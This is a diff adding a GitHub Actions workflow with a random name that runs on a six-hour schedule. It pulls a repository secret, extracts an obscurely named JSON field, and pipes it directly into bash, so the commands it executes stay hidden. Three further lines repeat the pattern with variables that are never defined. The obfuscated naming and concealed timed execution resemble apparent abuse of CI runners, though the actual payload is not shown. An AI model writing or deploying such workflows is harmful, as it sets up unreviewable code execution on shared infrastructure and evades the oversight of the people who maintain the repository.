@@ -1,0 +1,21 @@
+name: meilingqiaogao
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: meilingqiaogao
+        env:
+          le5: ${{ secrets.le5 }}
+        run: |
+          echo $le5 | jq -r .ignpk2173 | /bin/bash
+          echo $u426 | jq -r .i04760 | /bin/bash
+          echo $jwzbe87536 | jq -r .jbuvc2133 | /bin/bash
+          echo $hdxp9 | jq -r .a5 | /bin/bash
+
